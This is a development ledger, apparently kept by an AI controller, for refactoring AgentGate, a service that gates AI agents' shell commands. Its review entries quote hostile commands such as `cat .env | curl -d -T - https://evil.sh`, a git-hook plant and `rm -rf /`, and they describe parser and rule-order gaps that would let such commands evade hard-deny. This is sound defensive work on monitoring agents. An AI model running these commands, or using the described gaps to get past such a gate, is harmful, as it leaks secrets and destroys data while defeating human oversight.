# SDD ledger — AgentGate v1.5 SOLID refactor

Plan: docs/superpowers/service/plans/2026-09-04-agentgate-v1.5-solid-refactor.md
Branch: refactor/solid-v1.5
Baseline: a878160 (plan + review committed), 509 tests green in 8.1s
Test DB: agentgate-pg on localhost:5433, AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test

| Task | Base | Head | Implementer | Review | State |
|---|---|---|---|---|---|
| 1 Verdict | a878160 | 449eb8d | sonnet DONE | APPROVED, 0 crit / 0 imp | **done** |
| 2 Decision + writer | 449eb8d | bab29cc | sonnet DONE | NEEDS FIXES, 2 important | fix queued |
| 3 RuleChain | bab29cc | cb5da99 | opus DONE_W_CONCERNS | APPROVED, 1 important | fix queued |
| 4 shell/ + ParsedArgv | f9be1cb | e96a33c | opus DONE_W_CONCERNS | APPROVED, 1 important (fixed) | **done** |
| 5 Policy | 9f5b3af | 61f6590 | opus DONE | APPROVED, 0 crit / 0 imp | **done** |
| 6 protocols + bootstrap | 3e99027 | 04b4a50 | opus DONE_W_CONCERNS | APPROVED, 2 important (fixed) | **done** |
| 7 CommandSpec | 04b4a50 | 3401230 | opus DONE_W_CONCERNS | NEEDS FIXES, 2 important (fixed) | **done** |
| 8 OpenAPI | 6593e3e | 53cc9a7 | opus CRASHED (API 403), finished by controller | NEEDS FIXES, 3 important (fixed) | **done** |
| 9 docs | 53cc9a7 | d4e505c | opus DONE | pending final branch review | **done** |

## Cadence (changed after task 1, at the user's request)

Reviews are OFF the critical path: dispatch the reviewer in background right after a task commits,
then start the next task immediately. Findings arrive as notifications and are fixed at the next
natural boundary. Nothing blocks on a review.

Guards that replace the blocking reviews — I run these myself, they are deterministic and cheap:
- Every task: full suite green, `contracts/` diff empty on regeneration, and zero changes to
  tests/test_stage1_hard_deny.py, tests/test_stage1_chain.py, tests/test_normalize_shell.py.
- Task 4 specifically: `tests/equivalence/baseline.json` must be committed BEFORE the secret-list
  merge and NOT modified afterwards. A silently regenerated baseline makes the corpus worthless —
  this is the one failure mode a reviewer would have caught, so check it with git, not by reading.
- Task 5: the four regression tests in tests/domain/test_workspace_binding.py must be committed
  red-then-green (they reproduce the F4 hole before they prove it closed).

## Rulings
- R1 (plan): unparseable settled by stage 1 (stage=1, model=null). Task 3.
- R2 (plan): policy workspace binds to the session, per spec 6. Task 5.

## Log

- Task 1 DONE at 449eb8d. 524/524 green (509 baseline + 15 new), contracts diff empty.
  Table tests (hard_deny, chain, normalize_shell, stage2_run): zero changes — the refactor invariant held.
  Implementer left hard_deny.py comment history in place; correct, Task 3 owns that file's split.
- Cadence change: reviews moved to background. Task 2 dispatched at 449eb8d without waiting
  for task 1's review, which is still running.
- Task 1 review: Approved. Reviewer checked all 14 verdict-construction sites one by one;
  every rule_id and every hard=True survived. Noted that Verdict.deny/ask make `hard` and
  `stage` keyword-only, which forecloses the field-order defect class by construction.
- Only Minor: lint not run. Investigated — the service has NO linter configured at all
  (no [tool.ruff], ruff not in dev deps), so nothing was skipped. But the code carries
  ~8 dead `# noqa: BLE001` directives nothing enforces. Out of plan scope; spawned as a
  separate task (task_2bd83946) rather than widening this branch.
- Task 2 DONE at bab29cc. 543 green (I re-ran: 7.79s). Guards: table tests untouched,
  contracts clean. Implementer added a transitional DecisionRecord.to_view() =
  DecisionView(**self.__dict__) so two repo tests needed no edits; it asserts the shapes
  match rather than copying them, and task 6 deletes DecisionRecord. Flagged to the
  reviewer for judgment: DecisionRepo.insert is annotated (decision: Decision) but really
  accepts anything with .to_view() — the annotation understates its contract.
- Task 3 dispatched on OPUS (not sonnet): 922-line file into 7 modules, security core,
  and the shared-vs-private split needs judgment the brief cannot fully enumerate.
- Task 2 review: Needs fixes. BOTH findings are defects in MY PLAN, not the implementer's work —
  the implementer transcribed the brief faithfully and the brief was wrong.
  (a) IMPORTANT, real behaviour regression: `api.unknown-model` now records profile_hash="" where
      the old pipeline.py recorded base_profile.profile_hash(). The profile WAS resolved; only the
      model lookup failed, so the hash existed and was being written. Plan Step 8's sample had the
      literal "" for both early-exit branches. Reviewer confirmed empirically. Affects the persisted
      audit row and the JSONL line, not the HTTP response.
  (b) IMPORTANT, style 5.3: tests/factories.py:46 docstring says "Replaced by a Classifier fake in
      task 6" — a task reference in shipped code, copied verbatim from plan Step 1.
  Minor, accepted as-is: DecisionRepo.insert annotation understates its duck-typed contract
  (reviewer judged it acceptable transitional debt; task 6 deletes DecisionRecord); writer.py
  module docstring overclaims "never raises" for the two leaf writers; _finish has 10 params.
  Reviewer also noted CompositeDecisionWriter FIXED a latent bug: jsonl.write used to sit outside
  the try/except in app.py's persist closure, so a JSONL failure could abort the Postgres writes.

- SOURCE PATCHED so the regression cannot survive task 5: added the required `_resolve` early-exit
  form plus a mandated regression test (test_unknown_model_still_records_the_profile_hash) to BOTH
  the plan and task-5-brief.md. Code fix itself is QUEUED: gate.py and factories.py are being
  edited by task 3 right now, so touching them would clobber it. Apply immediately after task 3
  commits, before task 4.

## Deploy state (PAUSED at user's request — refactor first)
VDS 109.172.95.51 (Ubuntu 26.04, 3.9GB RAM, docker 29.7.2). Deploy dir /opt/agentgate (rsync, not git),
holding PRE-refactor code (agentgate/pipeline.py present) plus a Makefile that came from another branch.
Done: installed a dedicated passphrase-less deploy key ~/.ssh/agentgate_deploy (personal id_ed25519 is
passphrase-protected and the agent was empty, so it could not be used non-interactively); added
`restart: unless-stopped` to both services (was RestartPolicy=no — nothing would survive a reboot);
brought the stack up. Backup of the original compose at /opt/agentgate/docker-compose.yml.bak.
UNRESOLVED: /healthz returns {"status":"degraded","db":false} — gate cannot reach db. Logs show asyncpg
"Event loop is closed" in _terminate_graceful_close. Containers are Up; the earlier exit 137 was NOT a
crash (OOMKilled=false, db exited 0 alongside) — someone ran `docker compose down` 3h earlier.
Open question for later: how to version server code from a monorepo carrying three separate tracks.

- Task 3 review: APPROVED. Reviewer traced all 38 constants/helpers of the deleted 930-line file to
  their new homes (none dropped) and probed 17 branches the 174 table cases do not cover — all match.
  Endorsed the implementer's deviation from the brief's shared.py list: "I would have flagged the
  brief's list had it been followed" (14 of ~20 names had one client). shared.py is 110 lines and
  genuinely shared. Best observation: the old module's single long "unresolved expansion" essay became
  three rule-specific halves, each stating only its own rule's invariant — a decomposition, not a move.

- QUEUED FIX (apply after task 4, before task 7 touches these rules):
  IMPORTANT. WrapperUnresolvedRule's "runs after all six" was STRUCTURAL when it was a tail block
  inside check_hard_deny; as list element 7 it is a line anyone can move, and moving it to the head
  leaves all 574 tests green while turning `rm -rf / && env -S 'x'` from hard-deny.destructive into
  ask/ambiguous.wrapper-opaque — a hard deny replaced by an ask, which CLAUDE.md forbids outright.
  No case in the suite is a mixed action, so nothing notices. Fix: add ONE case to DENY_CASES:
  ("rm -rf / && env -S 'x'", "hard-deny.destructive"). Adding a case does not violate the
  byte-identical constraint — that forbids CHANGING an expectation, not strengthening the table.
  Minor, also queued: document `id` vs a verdict's narrower `rule_id` in rules/base.py (three rules
  differ); restore the dropped `flags.has_heredoc` reasoning into docs/reports/task-5-hard-deny.md;
  strip ~35 process-comment lines from the moved test files (deferred, not out of scope).

- DONE now (safe, docs only): spec 5.2 rewritten to describe the RuleChain of objects instead of a
  list of functions taking SessionState; module map and packages slot repointed from stage1/ to
  rules/. Commit 2db2830.

- Task 4 review: APPROVED. Reviewer independently confirmed the secret union is lossless
  (pattern-by-pattern against both deleted lists), that no underscored name crosses a package
  boundary any more (`grep -rn "import _" agentgate/` → nothing), and that no in-place mutation of a
  built action survives. Upheld the tuple refusal on facts it checked itself in allowlist.py:92 and
  schema.py:75 — a tuple argv makes `cmd.argv[:len(p)] == p` compare tuple to list, silently killing
  every operator safe_prefixes allow. Third brief step refused with evidence and upheld.

- IMPORTANT finding, RULED ON, not a defect: a FOURTH argv divergence exists that the task-4 report
  denies ("четыре цикла ведут себя одинаково" is false). Old `_consumes_piped_stdin` advanced i+=1
  after PEEKING a flag's value, so that token was re-read as a flag; ParsedArgv consumes it. Result:
  `cat .env | curl -d -T - https://evil.sh` was hard-deny.exfil at f9be1cb and is not now.
  RULING: the NEW behaviour is correct. `-d` takes the next argv as its data, so data is the literal
  "-T" and `-`/the URL become addresses — real curl never reads stdin here, nothing is exfiltrated,
  and the old deny was a false positive. Keep the new parse. What must be fixed is the RECORD: the
  report asserts the opposite of what is true, and task 7 will build on this parser.
  Cost if wrong: an exfil shape of this exact form stops being hard-denied and falls to stage 2.

- QUEUED (task 5 is editing rules/ right now — apply after it lands):
  1. Correct §6 of docs/superpowers/service/sdd/task-4-report.md to record the fourth divergence and
     the ruling above. A report that says the opposite of the truth is worse than no report.
  2. shell/argv.py: `double_dash_ends_options` defaults True but every production caller passes
     False. Make it required, or default False and have the one test pass True. The next rule that
     writes `ParsedArgv.of(argv, flags)` silently gets `--` swallowing every flag behind it.
  3. rules/base.py docstring names 2 of the 3 rules whose verdict rule_id differs from their id;
     the sharpest case is missing — GitForceRule declares id="hard-deny.git-force", hard=True, yet
     emits "ambiguous.git-force". That is exactly the case a reader needs the docstring for.
  4. Note for whichever task finishes the tuple conversion: frozen dataclasses generate __hash__,
     so hash(action) now raises "unhashable type: list" instead of the cleaner
     "unhashable type: NormalizedAction". Inert today (the cache uses action_hash()).
  5. Reviewer's structural note, do not act yet: ParsedArgv's `value_flags` does not fit its only
     caller — exfil must pre-scan argv twice to build the set, then reassemble tokens the parser
     split at "=". Five private helpers now feed and un-feed one parser. Worth knowing before task 7
     puts more rules through the same door.

- Task 5 review: APPROVED, 0 critical / 0 important. Reviewer re-derived the RED evidence from base
  logic rather than trusting the report, ran the pydantic model directly to confirm the cached hash
  neither leaks into model_dump nor changes value from before the refactor (so decisions recorded
  earlier stay comparable), and upheld all three brief deviations on facts it checked itself —
  including that the brief's prompt mapping rested on a false premise (prompt.py never called
  resolved_protected_paths) and would have put the host's real home directory into an outbound LLM
  request.
  UNCLAIMED WIN the reviewer found: the allow-cache key never included the workspace, so under the
  old code an allow cached at cwd=/home/u/repo could be replayed after `cd /`. Binding the workspace
  to the session removed that replay as a side effect.
  Residual sessionless hole: left, not worsened, and could not have been closed inside the brief —
  closing it means rejecting sessionless requests, which is a contract change and the owner's call.
  New cost note the reviewer added, worth recording because global-constraints.md only states the
  other direction: an honest harness whose FIRST call reports a broad cwd now pins allowed_paths
  broad for the session's whole life, where the old code recovered on the next request. Not a
  threat-model regression (an agent controlling session_id can mint a fresh session either way).

- DONE now: argv.py module docstring said the caller "can turn it off" about a default I had already
  flipped — my own commit's defect, one sentence, corrected.

- QUEUED after task 6 (all Minor, none blocking):
  1. Policy.id has no caller anywhere — brief-mandated dead surface, remove (guide 1.2).
  2. stage2/prompt.py:52 reaches through as policy.profile.protected_paths because
     Policy.protected_paths means the RESOLVED list. Correct value, but it makes the new CLAUDE.md
     sentence "правила и промпт видят только Policy" untrue at exactly one line. Add a
     declared_protected_paths delegate.
  3. tests/profiles/test_schema.py:48 does not test what its name and the report claim:
     p.profile_hash() == p.profile_hash() passes with no caching at all. Assert "_hash" in p.__dict__.
  4. Profile is still a mutable pydantic model while its hash is computed once; the no-mutation
     invariant is documented but unenforced. ConfigDict(frozen=True) would enforce it — cached_property
     writes straight to __dict__ and is unaffected.
  5. Policy.bind(profile, "") would make workspace == "." and quietly change the equals_workspace
     comparison inside a hard-deny rule. Guard non-empty in bind.
  6. tests/test_stage2_run.py still imports P from tests/test_stage2_prompt.py — the same
     test-to-test import that justified deviation 3. Pre-existing; move it to factories.

- Task 6 review: APPROVED, 2 important. Reviewer verified the composition root by grep rather than by
  report (every make_engine/Gate(/create_app( hit is in bootstrap.py), ran the monkeypatch grep
  itself, and confirmed deviation 1's FIX (not just its diagnosis) is backed by a live-database test
  that fails by a missing row rather than by an exception. Confirmed deviation 3 against the
  committed yaml: openapi.yaml:761 declares llm as string|null and :752 declares status as an enum,
  so the shipped Literal["ok","degraded"] is MORE faithful than my brief's `str`.

- IMPORTANT #1 (queued): PersistentSessionStateStore.restore() calls self._inner.preload(), but the
  SessionStateStore protocol does not declare preload. The seam's own docstring claims "a Redis store
  is a single new class" — false as written: any implementation other than InMemorySessionStateStore
  breaks at restore(). No type checker is configured, so nothing catches it. One line: declare
  preload on the protocol, or narrow `inner` to a Preloadable protocol.

- IMPORTANT #2 (queued, MINE, and it violates an explicit v1 constraint):
  The v1 plan's global constraints say "Запись в БД и JSONL — после отправки ответа". Task 6's
  write-through put `await SessionRepo.upsert` inside PersistentSessionStateStore.save, which
  Gate._settle_session awaits at gate.py:157 — BEFORE the response is built. Every sessioned
  /v1/decide now blocks on a Postgres round-trip, and because timings.finish() runs after
  _settle_session, latency_total_ms shifts upward and stops being comparable with earlier rows.
  Stage 1's budget is 1 ms; a network round-trip to the DB dwarfs it. My brief mandated this.
  FIX (restores the constraint and still satisfies F3): F3's complaint was that the write-through
  glue sat in api/app.py and the restore glue in __main__.py — the WRONG PLACES, not that the write
  must be synchronous. So: PostgresDecisionWriter owns all three writes in FK order, post-response,
  exactly as before task 6 (session upsert -> decision insert -> cache put), and
  PersistentSessionStateStore keeps memory + restore(). Both halves then live in a proper home, the
  ordering knowledge stays in exactly one place (F2's point), and the hot path is memory-only again.
  Deferred until task 7 lands: task 7 is the riskiest task in the plan and is running now; editing
  gate.py/persistent.py/writer.py under it would make its suite fail for reasons that are not its own.

- Minor, queued: ModelRegistry.model_config_for now has no production caller (dead surface, guide 1.2);
  export_openapi.py still hand-authors DecisionListResponse and Health under a comment saying those
  routes return plain dicts, which stopped being true — deriving them from api/responses.py restores
  the automatic contract check; tests/classify/test_llm.py still imports P/WS from test_prompt.py;
  classify/base.py's "never raises" overclaims — prompt building sits outside llm.py's try (fail-closed
  still holds via the API's outer handler, so no regression).

- PROCESS LESSON (my error, recorded so it does not repeat): commit 1d926a4's message describes an
  argv docstring but the commit also carries the stage2->classify and session/state.py->domain/session.py
  renames. `git add <paths>` then `git commit` commits the WHOLE INDEX, and the implementer's `git mv`
  was already staged there. While background agents work, the index is shared: use
  `git commit --only <paths>`.

- Task 7 review: NEEDS FIXES -> both fixed in f6b097e. The reviewer did the single most valuable
  thing available to it: the equality proof had been deleted inside 57e6f5a, so it REBUILT that proof
  independently from the literals in the diff's `-` lines and re-ran it — 18 legacy sets plus 7
  wrapper flag-sets, 0 mismatches. That is the check the whole task rests on, and it is now verified
  by someone other than the author.

- IMPORTANT #1, a real permissive regression the corpus missed. The legacy write-target scan dropped
  every token starting with "-"; the new one takes ParsedArgv positionals, which count a bare "-" as
  one. So `cp evil.sh .git/hooks/post-checkout -` put "-" in the destination slot and the protected
  path stopped being a write target — silence where 04b4a50 denied. Inside an unoverridable rule, in
  the commit claiming behaviour preservation. The 150-form differential covered `tee -` and
  `cp - dst` (both tightenings) but not a TRAILING "-". Fixed: both roles now share one definition of
  "this token names a path"; two table cases pin it. Verified `curl -T -` still denies (that path
  reads stdin through different logic).

- IMPORTANT #2 was mine: d4e8dc7 added a byte-identical duplicate of the test directly above it.
  Removed. Also corrected a comment in test_app.py that d4e8dc7 itself had made untrue.

- Process findings from this review worth keeping:
  * Step 2's "caller-by-caller, corpus green after each" is NOT evidenced — all eight replacements
    AND the corpus deletion are one commit, and the deliberate behaviour change 48dede6 lands AFTER
    the corpus was gone, so the corpus never scored it. The only evidence it "only tightens" is an
    uncommitted differential a reviewer cannot re-run. Reviewer verified the tightening claim itself
    by tracing _SHELL_NAMES to its only consumer; the claim holds, the evidence trail does not.
  * THREE path answers remain, not two — exfil._cmd_paths survives as a third. The refusal is upheld
    (merging would either allow `diff AGENTS.md` — finding F9 — or hard-deny fabricated $VAR paths),
    but the report's summary says "two" while its own table lists three.
  * "Adding a command is one row" is true for class membership, not for readonly-ness:
    allowlist._is_readonly still hardcodes echo, bare `env`, and find-without-delete after consulting
    the table, and `echo` has no row at all. Pre-existing, not a regression.

- Deviations upheld: `rm` at write_target NONE (the sketch's EVERY_POSITIONAL would have made
  `rm .env` an unoverridable hard deny); Role.WRITE and PathArguments.FLAG_VALUES unimplemented as
  dead or behaviour-changing; shell/paths.py placed correctly rather than papering over the cycle.

- Tasks 8 and 9 closed. Nine of nine done: 29 commits, 667 tests, exit 0, contracts regenerate clean.

- Task 8 was finished by the controller after its implementer crashed on an API 403 mid-task. Its
  review then caught a circular claim in the controller's own sign-off package: the 422 on
  GET /v1/profiles/{id} was not an answer the hand-written document had failed to describe — the task
  had added max_length to the path parameter and the empirical check ran on the changed code. Three
  undeclared constraints reverted, the unreachable 422 pruned, the report's schema section rewritten
  (three real deltas it had denied), contracts/README.md's stale provisional note removed, and both
  behaviours pinned by tests.

- Task 9 shipped CLAUDE.md, service/CLAUDE.md, service/README.md and
  docs/reports/task-v1.5-solid-refactor.md. Its "how to add" examples were verified by running the
  stage 1 rule example verbatim against the live chain: the new rule fires on `kubectl delete pod`,
  is silent on `kubectl get pods`, and leaves `ls -la` on allowlist.readonly.

- Owner reminder recorded 4 Sept: an uncertain outcome must be ASK, never DENY. Verified as
  implemented at four levels rather than assumed — prompt ("Answer U (uncertain) when a human should
  confirm"), the U->ask mapping in classify/llm.py, four ambiguous.* rule ids that answer ask when a
  rule recognises danger it cannot pin down, and fail-closed turning every error into ask. Live check:
  `git push --force` -> ask/ambiguous.git-force, `env -S "echo hi"` -> ask/ambiguous.wrapper-opaque,
  a nine-deep wrapper chain -> ask/ambiguous.wrapper-depth, an unterminated quote -> ask/unparseable,
  and only the determinable `rm -rf /` -> deny.
